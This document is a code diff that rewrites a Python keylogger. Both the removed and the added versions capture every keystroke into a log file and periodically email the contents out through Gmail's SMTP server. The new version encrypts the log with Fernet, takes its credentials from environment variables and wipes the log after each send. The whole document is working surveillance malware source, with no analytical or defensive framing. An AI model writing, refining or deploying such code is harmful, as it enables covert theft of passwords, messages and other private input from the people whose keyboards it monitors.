@@ -1,51 +1,69 @@
-import keyboard
+import os
 import smtplib
-from threading import Timer
-from email.mime.text import MIMEText
+import time
+from email.message import EmailMessage
+from cryptography.fernet import Fernet
+from keyboard import on_press, unhook_all
 
-# Record file name
-LOG_FILE = "log.txt"
+# Configuration
+EMAIL_ADDRESS = os.getenv('KEYLOGGER_EMAIL')  # Set this in your environment variables
+EMAIL_PASSWORD = os.getenv('KEYLOGGER_PASSWORD')  # Set this in your environment variables
+ENCRYPTION_KEY = os.getenv('KEYLOGGER_ENCRYPTION_KEY') or Fernet.generate_key().decode()
+LOG_FILE = "keylog.txt"
+SEND_INTERVAL = 60  # in seconds
 
-# Email information
-EMAIL_ADDRESS = "your_email_address@gmail.com"
-EMAIL_PASSWORD = "your_email_password"
-SEND_TO_EMAIL = "send_to_email_address@gmail.com"
-EMAIL_INTERVAL = 60  # Saniye cinsinden
+def encrypt_data(data: str) -> str:
+    cipher = Fernet(ENCRYPTION_KEY.encode())
+    return cipher.encrypt(data.encode()).decode()
 
-# Function to save keyboard keys
-def keylogger(e):
-    # Kayıt dosyasını açma
-    with open(LOG_FILE, "a") as f:
-        # Take the key pressed from the keyboard and write it to the file
-        key = e.name
-        f.write(key + "\n")
-
-# Email sending function
 def send_email():
-    # Reading the record file
-    with open(LOG_FILE, "r") as f:
-        data = f.read()
+    if not os.path.exists(LOG_FILE):
+        return
 
-    # Create email content
-    msg = MIMEText(data)
-    msg["Subject"] = "Keylogger Data"
-    msg["From"] = EMAIL_ADDRESS
-    msg["To"] = SEND_TO_EMAIL
+    with open(LOG_FILE, 'r') as file:
+        log_content = file.read()
 
-    # Connect to the email server and send the email
-    server = smtplib.SMTP("smtp.gmail.com", 587)
-    server.starttls()
-    server.login(EMAIL_ADDRESS, EMAIL_PASSWORD)
-    server.sendmail(EMAIL_ADDRESS, SEND_TO_EMAIL, msg.as_string())
-    server.quit()
+    if not log_content.strip():
+        return
 
-# Timer function
-def timer():
-    # Belirli aralıklarla e-posta gönderme
-    Timer(EMAIL_INTERVAL, timer).start()
-    send_email()
+    encrypted_content = encrypt_data(log_content)
 
-# Starting the program
-timer()
-keyboard.on_release(keylogger)
-keyboard.wait()
+    msg = EmailMessage()
+    msg['Subject'] = 'Keylogger Report'
+    msg['From'] = EMAIL_ADDRESS
+    msg['To'] = EMAIL_ADDRESS
+    msg.set_content(f"Encrypted Keylogs:\n\n{encrypted_content}")
+
+    try:
+        with smtplib.SMTP('smtp.gmail.com', 587) as server:
+            server.starttls()
+            server.login(EMAIL_ADDRESS, EMAIL_PASSWORD)
+            server.send_message(msg)
+            print("Email sent successfully!")
+
+    except Exception as e:
+        print(f"Failed to send email: {e}")
+
+    # Clear the log file after sending
+    open(LOG_FILE, 'w').close()
+
+def log_key(event):
+    with open(LOG_FILE, 'a') as file:
+        file.write(event.name if len(event.name) == 1 else f'[{event.name}]')
+        file.write(' ')
+
+def main():
+    print("Keylogger is running... Press CTRL+C to stop.")
+    try:
+        on_press(log_key)
+
+        while True:
+            time.sleep(SEND_INTERVAL)
+            send_email()
+
+    except KeyboardInterrupt:
+        print("Exiting keylogger...")
+        unhook_all()
+
+if __name__ == "__main__":
+    main()
